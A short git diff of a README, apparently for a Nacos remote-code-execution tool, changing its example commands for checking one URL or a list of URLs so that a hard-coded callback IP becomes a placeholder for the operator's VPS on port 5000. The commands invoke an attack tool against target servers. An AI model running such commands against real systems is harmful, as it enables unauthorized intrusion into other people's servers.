@@ -23,13 +23,13 @@
 
 
 ### 2. 单url验证
-```python .\Nacos_Rce.py -t 47.120.63.201 -p 5000 -u http://xxx.xxx.xxx```
+```python .\Nacos_Rce.py -t vps的ip地址 -p 5000 -u http://xxx.xxx.xxx```
 ![image](https://github.com/user-attachments/assets/17683bc9-5851-4222-9df7-6b71a8ddd591)
 
 
 
 ### 3. 多url验证
-```python .\Nacos_Rce.py -t 47.120.63.201 -p 5000 -f ./url.txt```
+```python .\Nacos_Rce.py -t vps的ip地址 -p 5000 -f ./url.txt```
 ![image](https://github.com/user-attachments/assets/7eecdf9e-7c74-4115-afbc-5af9362f4db9)
 
 
